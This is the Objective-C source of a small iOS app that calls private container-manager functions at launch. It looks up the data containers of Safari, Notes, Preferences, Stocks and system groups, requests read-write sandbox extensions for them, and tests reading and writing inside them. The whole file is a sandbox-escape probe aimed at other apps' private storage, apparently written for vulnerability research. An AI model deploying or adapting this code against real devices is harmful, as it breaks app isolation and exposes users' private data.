// sboldclass — old container_create_or_lookup (class/identifier) probe.
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <signal.h>
#import <sys/stat.h>
#import <sys/wait.h>
#import <fcntl.h>

typedef void *(*fn_old_create)(const char *, uint32_t, int, int *);
typedef char *(*fn_old_copy_path)(void *);
typedef int (*fn_old_acquire)(void *, const char *, uint64_t);
typedef void (*fn_old_free)(void *);

static fn_old_create old_create;
static fn_old_copy_path old_copy_path;
static fn_old_acquire old_acquire;
static fn_old_free old_free;
static FILE *gLog;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    NSLog(@"[sboleg] %@", s);
    if (gLog) { fprintf(gLog, "%s\n", s.UTF8String); fflush(gLog); }
}

struct result { int obj; int err; int acquire; int fd; char path[1024]; };

static void child(const char *ident, uint32_t cls, int fd) {
    alarm(5);
    struct result r; memset(&r,0,sizeof(r));
    int err=0;
    void *o = old_create ? old_create(ident, cls, 0, &err) : NULL;
    r.obj = o ? 1 : 0; r.err = err;
    if (o && old_copy_path) {
        char *p = old_copy_path(o);
        if (p) { strncpy(r.path, p, sizeof(r.path)-1); free(p); }
    }
    if (o && old_acquire) {
        r.acquire = (int)old_acquire(o, "com.apple.app-sandbox.read-write", 0);
        if (r.path[0]) { errno=0; int f=open(r.path, O_RDONLY|O_DIRECTORY); r.fd=f; if(f>=0) close(f); }
    }
    if (o && old_free) old_free(o);
    write(fd, &r, sizeof(r));
    _exit(0);
}

static void run(const char *label, const char *ident, uint32_t cls) {
    int fds[2]; if (pipe(fds)!=0) return;
    pid_t pid=fork();
    if (pid==0) { close(fds[0]); child(ident,cls,fds[1]); _exit(0); }
    close(fds[1]);
    struct result r; memset(&r,0,sizeof(r));
    read(fds[0], &r, sizeof(r)); close(fds[0]);
    int st=0; waitpid(pid,&st,0);
    L(@"[%s] cls=%u id=%s obj=%d err=%d acquire=%d path=%s fd=%d crash=%d", label, cls, ident,
      r.obj, r.err, r.acquire, r.path, r.fd, WIFSIGNALED(st)?WTERMSIG(st):0);
    if (r.obj && r.path[0]) {
        NSString *p = [NSString stringWithUTF8String:r.path];
        errno=0; DIR *d=opendir(p.fileSystemRepresentation);
        L(@"[%s] opendir %@ -> %p errno=%d", label, p, d, errno);
        if (d) closedir(d);
        NSString *m=[p stringByAppendingPathComponent:@"sboleg_marker"];
        errno=0; int fd=open(m.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);
        L(@"[%s] write %@ -> %d errno=%d", label, m, fd, errno);
        if (fd>=0){write(fd,"x",1);close(fd);unlink(m.fileSystemRepresentation);}
    }
}

static void runProbe(void) {
    @autoreleasepool {
        gLog=fopen([NSHomeDirectory() stringByAppendingPathComponent:@"Documents/sboleg.log"].fileSystemRepresentation,"w");
        L(@"=== sboldclass start pid=%d", getpid());
        void *h=dlopen("/usr/lib/system/libsystem_containermanager.dylib", RTLD_NOW|RTLD_LOCAL);
        if (!h) { L(@"dlopen fail"); return; }
        old_create=(fn_old_create)dlsym(h,"container_create_or_lookup");
        old_copy_path=(fn_old_copy_path)dlsym(h,"container_copy_path");
        old_acquire=(fn_old_acquire)dlsym(h,"container_acquire_sandbox_extension");
        old_free=(fn_old_free)dlsym(h,"container_free_object");
        L(@"create=%p copy=%p acq=%p free=%p", old_create, old_copy_path, old_acquire, old_free);
        run("2-safari","com.apple.mobilesafari",2);
        run("2-prefs","com.apple.Preferences",2);
        run("2-notes","com.apple.mobilenotes",2);
        run("2-self","app.lake9674.aquila8809",2);
        run("7-notes","group.com.apple.notes",7);
        run("7-stocks","group.com.apple.stocks",7);
        run("7-mg","systemgroup.com.apple.mobilegestaltcache",7);
        run("7-self","group.8e0bc870a21520b9.1",7);
        run("12-geod","com.apple.geod",12);
        run("12-prefs","com.apple.Preferences",12);
        run("13-mg","systemgroup.com.apple.mobilegestaltcache",13);
        run("1-geod","com.apple.geod",1);
        run("0-geod","com.apple.geod",0);
        L(@"=== sboldclass done ===");
        if(gLog){fclose(gLog);gLog=NULL;}
    }
}

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (nonatomic, strong) UIWindow *window;
@end
@implementation AppDelegate
- (BOOL)application:(UIApplication *)app didFinishLaunchingWithOptions:(NSDictionary *)opts {
    self.window=[[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController *vc=[UIViewController new]; vc.view.backgroundColor=[UIColor systemBackgroundColor];
    UILabel *l=[[UILabel alloc] initWithFrame:vc.view.bounds]; l.text=@"sboleg"; l.textAlignment=NSTextAlignmentCenter;
    [vc.view addSubview:l]; self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0), ^{ runProbe(); });
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
